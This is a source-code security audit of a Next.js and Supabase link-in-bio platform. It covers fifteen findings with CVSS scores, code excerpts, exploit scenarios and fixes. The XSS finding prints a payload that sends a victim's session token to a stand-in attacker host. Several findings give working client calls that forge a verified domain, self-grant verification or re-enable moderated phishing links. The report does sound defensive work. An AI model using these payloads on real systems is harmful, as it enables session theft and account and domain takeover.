# Production Security Audit & Penetration Assessment Report

**Target**: Link-in-Bio Platform (`link-in-bio`)  
**Assessment Standard**: OWASP Top 10 (2021), CVSS v3.1 Scoring, STRIDE Threat Modeling  
**Auditor**: Senior Application Security Engineer & Penetration Tester  
**Date**: September 7, 2026  
**Status**: Completed — Defensive Source Code Security Audit

---

## 1. Executive Summary

A comprehensive defensive source code security audit and architectural penetration assessment was conducted on the Link-in-Bio application repository. The target application is a Next.js 14 App Router application deployed on Vercel and backed by Supabase (PostgreSQL, GoTrue Auth, and Storage).

While the application demonstrates commendable defensive patterns in several areas (e.g., automated SVG/Canvas avatar downscaling, YouTube/Vimeo ID regex extraction, and Security Definer RPC routing for custom domains), several critical and high-severity security vulnerabilities were discovered across the authorization, database RLS, and client-server boundaries.

### Summary of Discovered Vulnerabilities

| Finding ID | Severity | CVSS v3.1 | OWASP Top 10 | Vulnerability Title | Affected Components |
|---|:---:|:---:|---|---|---|
| **SEC-01** | **P0 Critical** | **9.8** | A01: Broken Access Control | Client-Side Hardcoded Admin Email Escalation Backdoor | `lib/adminAuth.js`, `app/admin/layout.js`, `app/login/page.js` |
| **SEC-02** | **P0 Critical** | **9.6** | A03: Injection (XSS) | Stored Cross-Site Scripting (XSS) via Public Profile JSON-LD Structured Data | `app/[username]/page.js:180` |
| **SEC-03** | **P1 High** | **8.5** | A01: Broken Access Control | Arbitrary Custom Domain Takeover via Missing RLS Verification Check | `supabase/migrations/002_production_hardening.sql:105`, `middleware.js` |
| **SEC-04** | **P1 High** | **8.1** | A01: Broken Access Control | Mass Assignment Privilege Escalation (`is_verified`, `account_status`) via Direct RLS | `supabase/migrations/002_production_hardening.sql:38`, `DashboardContext.js:423` |
| **SEC-05** | **P1 High** | **7.7** | A04: Insecure Design | Moderation Bypass: Creators Can Un-Disable Banned Blocks | `supabase/migrations/002_production_hardening.sql:65`, `app/api/admin/links/route.js` |
| **SEC-06** | **P1 High** | **7.5** | A01: Broken Access Control | Missing Supabase Storage Bucket & Object RLS Policies | `supabase/migrations/`, `app/dashboard/profile/page.js:292` |
| **SEC-07** | **P2 Medium** | **6.5** | A04: Insecure Design | Serverless In-Memory Rate Limiter Bypass | `app/api/analytics/route.js:8`, `app/api/reports/submit/route.js:7` |
| **SEC-08** | **P2 Medium** | **6.3** | A01: Broken Access Control | System Reserved Username Hijacking via OAuth and Onboarding | `app/auth/callback/page.js:106`, `app/onboarding/page.js:243` |
| **SEC-09** | **P2 Medium** | **6.1** | A07: Identification & Auth Failures | Password Change without Current Password Verification | `app/api/account/actions/route.js:42` |
| **SEC-10** | **P2 Medium** | **5.8** | A01: Broken Access Control | Over-Privileged Moderator Role: Arbitrary Account Deletion & Settings Mutation | `app/api/admin/users/route.js:131`, `app/api/admin/settings/route.js:51` |
| **SEC-11** | **P2 Medium** | **5.4** | A05: Security Misconfiguration | Content Security Policy Permits `'unsafe-inline'` and `'unsafe-eval'` | `next.config.js:12` |
| **SEC-12** | **P2 Medium** | **5.3** | A04: Insecure Design | Broken Analytics Purge: Missing RLS DELETE Policy | `supabase/migrations/002_production_hardening.sql:97`, `account/actions/route.js:100` |
| **SEC-13** | **P3 Low** | **3.8** | A04: Insecure Design | Cosmetic 2FA & Session Revocation (Security Theater) | `app/dashboard/settings/page.js:57`, `app/api/account/actions/route.js:88` |
| **SEC-14** | **P3 Low** | **3.5** | A02: Cryptographic Failures | Service-Role Client Falls Back to Anon Key | `lib/supabaseAdmin.js:22` |
| **SEC-15** | **P3 Low** | **3.1** | A01: Broken Access Control | Irreversible Account Deletion Without Re-Authentication | `app/api/account/delete/route.js:8` |

---

## 2. Detailed Vulnerability Technical Dossiers

---

### [SEC-01] P0 CRITICAL — Client-Side Hardcoded Admin Email Escalation Backdoor

- **CVSS v3.1 Base Score**: **9.8** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **OWASP Category**: A01:2021 — Broken Access Control
- **CWE**: CWE-284 (Improper Access Control), CWE-798 (Use of Hardcoded Credentials)
- **Affected Files**:
  - `lib/adminAuth.js#L49-L82`
  - `app/admin/layout.js#L57-L84`
  - `app/login/page.js#L48-L53`, `L89-L93`

#### Root Cause Analysis
In `lib/adminAuth.js` and `app/admin/layout.js`, administrative authorization is derived from an unverified string match against hardcoded email strings:
```javascript
// lib/adminAuth.js lines 49-53
const isSuperAdminEmail =
  user.email === 'pmkaulani@gmail.com' ||
  (process.env.ADMIN_EMAIL && user.email === process.env.ADMIN_EMAIL) ||
  (process.env.NEXT_PUBLIC_ADMIN_EMAIL && user.email === process.env.NEXT_PUBLIC_ADMIN_EMAIL);

if (isSuperAdminEmail) {
  // Auto-sync into platform_admins so they are permanently stored
  await adminClient.from('platform_admins').upsert(
    { user_id: user.id, role: 'superadmin' },
    { onConflict: 'user_id' }
  );
  return { isAdmin: true, role: 'superadmin', user };
}
```

#### Exploit Scenario
1. In Supabase, if email confirmation is disabled or if a third-party OAuth provider (or custom OIDC) does not guarantee verified email claims, an attacker signs up with `email: 'pmkaulani@gmail.com'`.
2. The attacker calls any administrative API route (e.g. `GET /api/admin/users`) providing their authenticated JWT.
3. `verifyAdminUser` executes on the server, matches `user.email === 'pmkaulani@gmail.com'`, invokes `adminClient.from('platform_admins').upsert({ user_id: user.id, role: 'superadmin' })`, and permanently grants the attacker root administrative access.
4. Furthermore, `NEXT_PUBLIC_ADMIN_EMAIL` leaks the target email address to anyone inspecting the client-side JavaScript bundle.

#### Concrete Remediation
1. Remove all hardcoded email string checks and `NEXT_PUBLIC_ADMIN_EMAIL` references.
2. Rely exclusively on pre-seeded rows in `platform_admins` authenticated by Supabase UUID (`auth.uid() = user_id`).
3. Seed the initial superadmin through a secure database migration or Supabase CLI seed script using UUID, never dynamic runtime email matching.

---

### [SEC-02] P0 CRITICAL — Stored Cross-Site Scripting (XSS) via Public Profile JSON-LD

- **CVSS v3.1 Base Score**: **9.6** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`
- **OWASP Category**: A03:2021 — Injection (XSS)
- **CWE**: CWE-79 (Cross-Site Scripting)
- **Affected File**: `app/[username]/page.js#L163-L182`

#### Root Cause Analysis
In `app/[username]/page.js`, profile structured metadata is rendered inside a `<script type="application/ld+json">` tag using `dangerouslySetInnerHTML`:
```javascript
// app/[username]/page.js line 163-181
const profileJsonLd = {
  '@context': 'https://schema.org',
  '@type': 'ProfilePage',
  mainEntity: {
    '@type': 'Person',
    name: (profile.display_name || profile.username || '').slice(0, 200),
    alternateName: `@${(profile.username || '').slice(0, 30)}`,
    description: (profile.bio || '').slice(0, 300) || undefined,
    image: profile.avatar_url || undefined,
    url: `https://${process.env.NEXT_PUBLIC_APP_HOST || 'localhost:3000'}/${profile.username}`,
  },
};

return (
  <>
    <script
      type="application/ld+json"
      dangerouslySetInnerHTML={{ __html: JSON.stringify(profileJsonLd) }}
    />
    ...
```
`JSON.stringify()` does **not** escape HTML closing tags (specifically `</script>`). In standard HTML parsing, any occurrence of `</script>` inside an inline script block terminates the script immediately, and subsequent text is parsed as HTML markup!

#### Exploit Scenario
1. An attacker registers an account and sets their `display_name` or `bio` to:
   ```html
   </script><script>fetch('https://attacker.com/steal?c='+encodeURIComponent(localStorage.getItem('sb-myproject-auth-token')))</script>
   ```
2. When any victim (visitor, follower, or platform admin) navigates to `https://link-in-bio.com/attacker`, Next.js SSR executes `JSON.stringify(profileJsonLd)` and sends the raw payload.
3. The victim's browser parser encounters `</script>`, closes the JSON-LD block, parses the injected `<script>`, and executes the attacker's payload.
4. Because CSP in `next.config.js` explicitly allows `'unsafe-inline'`, the browser executes the script without error, exfiltrating the victim's Supabase session tokens from `localStorage`.

#### Concrete Remediation
Sanitize the serialized JSON string to replace `<` characters with their Unicode escape sequence `\u003c`:
```javascript
const safeJsonLdString = JSON.stringify(profileJsonLd).replace(/</g, '\\u003c');

<script
  type="application/ld+json"
  dangerouslySetInnerHTML={{ __html: safeJsonLdString }}
/>
```

---

### [SEC-03] P1 HIGH — Arbitrary Custom Domain Takeover via Missing RLS Verification Check

- **CVSS v3.1 Base Score**: **8.5** (High) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:L`
- **OWASP Category**: A01:2021 — Broken Access Control
- **CWE**: CWE-284 (Improper Access Control)
- **Affected Files**:
  - `supabase/migrations/002_production_hardening.sql#L105-L106`
  - `middleware.js#L38-L60`

#### Root Cause Analysis
In `002_production_hardening.sql`, the RLS policy for `custom_domains` is:
```sql
create policy "Owners can manage their own custom domain"
  on custom_domains for all
  using (auth.uid() = profile_id)
  with check (auth.uid() = profile_id);
```
The policy grants full permissions (including `INSERT` and `UPDATE`) without asserting `verified = false`.

#### Exploit Scenario
1. Attacker signs into their creator account.
2. Attacker runs:
   ```javascript
   supabase.from('custom_domains').insert({
     profile_id: user.id,
     domain: 'victim-domain.com',
     username: 'attacker',
     verification_token: 'fake',
     verified: true // Directly asserted by attacker!
   });
   ```
3. PostgreSQL allows the insert because `auth.uid() = profile_id`.
4. When any visitor navigates to `victim-domain.com`, `middleware.js` invokes `resolve_custom_domain('victim-domain.com')`, which finds `verified = true` and rewrites the request to `/attacker`.
5. The attacker successfully hijacks traffic intended for `victim-domain.com`.

#### Concrete Remediation
1. Restrict `custom_domains` client insert policy to `with check (auth.uid() = profile_id and verified = false)`.
2. Add a PostgreSQL trigger that raises an exception if any client role (`authenticated` or `anon`) attempts to mutate the `verified` column.

---

### [SEC-04] P1 HIGH — Mass Assignment Privilege Escalation via Direct Supabase Client

- **CVSS v3.1 Base Score**: **8.1** (High) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L`
- **OWASP Category**: A01:2021 — Broken Access Control
- **CWE**: CWE-915 (Improperly Controlled Modification of Dynamically Determined Object Attributes)
- **Affected Files**:
  - `supabase/migrations/002_production_hardening.sql#L38-L40`
  - `app/dashboard/DashboardContext.js#L48-L75`, `L423`

#### Root Cause Analysis
In `002_production_hardening.sql`, the `profiles` update policy is:
```sql
create policy "Users can update their own profile"
  on profiles for update using (auth.uid() = id);
```
PostgreSQL RLS `USING` clauses evaluate row visibility; they do NOT restrict column modifications. In `DashboardContext.js`, `VALID_PROFILE_COLUMNS` includes sensitive administrative fields:
`'is_verified'`, `'account_status'`, `'suspension_reason'`.

#### Exploit Scenario
1. An attacker with a regular creator account executes in DevTools:
   ```javascript
   await supabase.from('profiles').update({
     is_verified: true,
     account_status: 'active',
     suspension_reason: null
   }).eq('id', user.id);
   ```
2. PostgreSQL accepts the mutation because `auth.uid() = id`.
3. The attacker now displays a platform verification badge and removes any administrative suspension applied to their account.

#### Concrete Remediation
Deploy a `BEFORE UPDATE` trigger on `profiles` that raises an exception if `current_user in ('authenticated', 'anon')` and `new.is_verified`, `new.account_status`, or `new.suspension_reason` differs from `old`.

---

### [SEC-05] P1 HIGH — Moderation Bypass: Creators Can Un-Disable Banned Blocks

- **CVSS v3.1 Base Score**: **7.7** (High) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`
- **OWASP Category**: A04:2021 — Insecure Design
- **CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)
- **Affected Files**:
  - `supabase/migrations/002_production_hardening.sql#L65-L67`
  - `app/api/admin/links/route.js#L78-L86`

#### Root Cause Analysis
When an administrator disables a link containing malware or phishing via `/api/admin/links`, the server sets `is_disabled: true` and `moderation_reason: 'Disabled by Trust & Safety'`.
However, the RLS policy on `blocks` is:
```sql
create policy "Users can update their own blocks"
  on blocks for update using (auth.uid() = profile_id);
```
There are no column checks preventing the block owner from updating `is_disabled` or `moderation_reason`.

#### Exploit Scenario
1. A malicious creator hosts a phishing block. Platform moderators disable the block.
2. The creator opens DevTools and executes:
   ```javascript
   supabase.from('blocks').update({ is_disabled: false, moderation_reason: null }).eq('id', blockId);
   ```
3. PostgreSQL updates the record. The phishing link is immediately active on the public profile again.

#### Concrete Remediation
Deploy a `BEFORE UPDATE` trigger on `blocks` preventing changes to `is_disabled` or `moderation_reason` by non-service-role callers.

---

### [SEC-06] P1 HIGH — Missing Supabase Storage Bucket & Object RLS Policies

- **CVSS v3.1 Base Score**: **7.5** (High) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L`
- **OWASP Category**: A01:2021 — Broken Access Control
- **CWE**: CWE-732 (Incorrect Permission Assignment for Critical Resource)
- **Affected Files**:
  - `supabase/migrations/` (No storage migration exists)
  - `app/dashboard/profile/page.js#L292`

#### Root Cause Analysis
The codebase uploads avatar files directly from the browser to Supabase Storage:
```javascript
const path = `avatars/${userId}.webp`;
supabase.storage.from('avatars').upload(path, compressedBlob, { upsert: true });
```
None of the SQL migrations configure bucket `avatars` or create policies on `storage.objects`. If the bucket is created in Supabase with standard public permissions, object writes are unrestricted.

#### Exploit Scenario
1. Attacker obtains the UUID of target user `target-user-id`.
2. Attacker calls `supabase.storage.from('avatars').upload('avatars/target-user-id.webp', maliciousImage, { upsert: true })`.
3. The victim's avatar is replaced with attacker-controlled content.
4. If MIME-type validation is absent, an attacker can upload HTML or SVG files containing XSS payloads.

#### Concrete Remediation
Add a migration defining the `avatars` bucket with a 2MB limit, restricted MIME types (`image/webp`, `image/jpeg`, `image/png`), and RLS policies on `storage.objects` enforcing `storage.filename(name) = (auth.uid()::text || '.webp')`.

---

### [SEC-07] P2 MEDIUM — Serverless In-Memory Rate Limiter Bypass

- **CVSS v3.1 Base Score**: **6.5** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L`
- **OWASP Category**: A04:2021 — Insecure Design
- **CWE**: CWE-770 (Allocation of Resources Without Limits or Throttling)
- **Affected Files**:
  - `app/api/analytics/route.js#L8-L35`
  - `app/api/reports/submit/route.js#L7-L24`

#### Root Cause Analysis
The rate limiters in `/api/analytics` and `/api/reports/submit` use in-memory JavaScript `Map` objects (`rateLimitMap = new Map()`).
On serverless platforms like Vercel, requests are routed across many independent, ephemeral Node.js lambda instances. Process memory is not shared between instances. Furthermore, `clientIp` is extracted via `req.headers.get('x-forwarded-for')?.split(',')[0]`, which can be spoofed if client-supplied headers are prioritized.

#### Concrete Remediation
Use a shared, persistent rate limiter (e.g. Upstash Redis / `@upstash/ratelimit`) or enforce rate limiting at the edge reverse-proxy level (Vercel Firewall / Cloudflare WAF).

---

### [SEC-08] P2 MEDIUM — System Reserved Username Hijacking via OAuth and Onboarding

- **CVSS v3.1 Base Score**: **6.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`
- **OWASP Category**: A01:2021 — Broken Access Control
- **CWE**: CWE-284 (Improper Access Control)
- **Affected Files**:
  - `app/auth/callback/page.js#L106-L116`
  - `app/onboarding/page.js#L243-L253`

#### Root Cause Analysis
While `/api/account/actions` checks `reserved_usernames`, the automatic profile creation in `app/auth/callback/page.js` and the step-1 validation in `app/onboarding/page.js` only check if the username is taken in `profiles`. They do **not** query `reserved_usernames`.

#### Exploit Scenario
1. Attacker signs up with Google OAuth using email `support@attacker-domain.com`.
2. `slugify` extracts `base = 'support'`.
3. `supabase.from('profiles').insert({ username: 'support', ... })` succeeds because `@support` is not yet taken in `profiles`, despite being listed in `reserved_usernames`.
4. Attacker controls the official platform handle `@support`.

#### Concrete Remediation
Enforce username reservation at the PostgreSQL database level using a `BEFORE INSERT OR UPDATE` trigger on `profiles` checking against `reserved_usernames`.

---

### [SEC-09] P2 MEDIUM — Password Change without Current Password Verification

- **CVSS v3.1 Base Score**: **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`
- **OWASP Category**: A07:2021 — Identification & Authentication Failures
- **CWE**: CWE-620 (Unverified Password Change)
- **Affected File**: `app/api/account/actions/route.js#L42-L65`

#### Root Cause Analysis
In `app/api/account/actions/route.js`, when `action === 'change_password'`, the handler immediately calls `supabase.auth.updateUser({ password: newPassword })` using the JWT bearer client. It does not challenge or verify the user's existing password.

#### Exploit Scenario
If an attacker gains brief access to a user's logged-in workstation or steals their access token, the attacker changes the user's password without needing the current password, permanently locking the victim out.

#### Concrete Remediation
Require re-authentication with `oldPassword` (e.g. `signInWithPassword`) before executing `updateUser({ password: newPassword })`.

---

### [SEC-10] P2 MEDIUM — Over-Privileged Moderator Role: Arbitrary Account Deletion

- **CVSS v3.1 Base Score**: **5.8** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H`
- **OWASP Category**: A01:2021 — Broken Access Control
- **CWE**: CWE-269 (Improper Privilege Management)
- **Affected Files**:
  - `app/api/admin/users/route.js#L131-L158`
  - `app/api/admin/settings/route.js#L51-L93`

#### Root Cause Analysis
`platform_admins` supports roles `('admin', 'superadmin', 'moderator')`. However, `/api/admin/users` and `/api/admin/settings` check only `if (!adminCheck.isAdmin)`. They do not enforce role-based segregation. A user with role `'moderator'` can delete any creator account or toggle platform-wide feature flags.

#### Concrete Remediation
Enforce explicit role checks:
```javascript
if (action === 'delete_user' && adminCheck.role !== 'superadmin') {
  return NextResponse.json({ error: 'Forbidden: Superadmin access required to delete accounts.' }, { status: 403 });
}
```

---

### [SEC-11] P2 MEDIUM — Content Security Policy Permits `'unsafe-inline'` and `'unsafe-eval'`

- **CVSS v3.1 Base Score**: **5.4** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
- **OWASP Category**: A05:2021 — Security Misconfiguration
- **CWE**: CWE-1021 (Improper Restriction of Rendered UI or Scripts)
- **Affected File**: `next.config.js#L12`

#### Root Cause Analysis
`next.config.js` configures:
`script-src 'self' 'unsafe-inline' 'unsafe-eval'`.
`'unsafe-inline'` eliminates browser protection against inline script injections, directly enabling the exploitation of SEC-02 (JSON-LD Stored XSS).

#### Concrete Remediation
Adopt strict CSP in production using nonce-based script loading via Next.js middleware, and remove `'unsafe-eval'` from production builds.

---

### [SEC-12] P2 MEDIUM — Broken Analytics Purge: Missing RLS DELETE Policy

- **CVSS v3.1 Base Score**: **5.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N`
- **OWASP Category**: A04:2021 — Insecure Design
- **CWE**: CWE-639 (Authorization Defect)
- **Affected Files**:
  - `supabase/migrations/002_production_hardening.sql#L97-L101`
  - `app/api/account/actions/route.js#L100`

#### Root Cause Analysis
`app/api/account/actions/route.js` attempts to purge analytics via `await supabase.from('analytics_events').delete().eq('profile_id', userId)`.
However, `002_production_hardening.sql` defines only a `SELECT` policy on `analytics_events`. There is no `DELETE` policy. Under Postgres RLS, any operation without a matching policy fails.

#### Concrete Remediation
Add `create policy "Owners can delete their own analytics" on analytics_events for delete using (auth.uid() = profile_id);`.

---

### [SEC-13] P3 LOW — Cosmetic 2FA & Session Revocation (Security Theater)

- **CVSS v3.1 Base Score**: **3.8** (Low) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N`
- **OWASP Category**: A04:2021 — Insecure Design
- **Affected Files**:
  - `app/api/account/actions/route.js#L88-L96`, `L353-L374`
  - `app/dashboard/settings/page.js#L57`

#### Root Cause Analysis
1. **2FA Toggle**: `toggle_2fa` updates `two_factor_enabled` on `profiles`. This column does not exist in the baseline schema, and `app/login/page.js` never prompts for TOTP or MFA during login.
2. **Session Revocation**: `revoke_session` removes an item from `currentProfile.socials._active_sessions`. It does not invalidate the underlying Supabase Auth JWT or refresh token.

#### Concrete Remediation
Integrate authentic Supabase MFA (`supabase.auth.mfa.enroll` / `challenge`), or remove the 2FA UI toggle until backend TOTP verification is implemented.

---

### [SEC-14] P3 LOW — Service-Role Client Falls Back to Anon Key

- **CVSS v3.1 Base Score**: **3.5** (Low) — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:L`
- **OWASP Category**: A02:2021 — Cryptographic Failures
- **Affected File**: `lib/supabaseAdmin.js#L22-L26`

#### Root Cause Analysis
If `SUPABASE_SERVICE_ROLE_KEY` is not set in production environment variables, `createAdminClient()` falls back to `NEXT_PUBLIC_SUPABASE_ANON_KEY`. Administrative operations then fail silently under RLS rather than failing loudly with a configuration error.

#### Concrete Remediation
Throw an explicit error if `SUPABASE_SERVICE_ROLE_KEY` is absent in production.

---

### [SEC-15] P3 LOW — Irreversible Account Deletion Without Re-Authentication

- **CVSS v3.1 Base Score**: **3.1** (Low) — `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:H`
- **OWASP Category**: A01:2021 — Broken Access Control
- **Affected File**: `app/api/account/delete/route.js#L8-L70`

#### Root Cause Analysis
`/api/account/delete` permanently cascades deletes across blocks, reports, profiles, and auth credentials with no requirement for password confirmation.

#### Concrete Remediation
Require the user's current password in the deletion payload and verify credentials before invoking `auth.admin.deleteUser`.
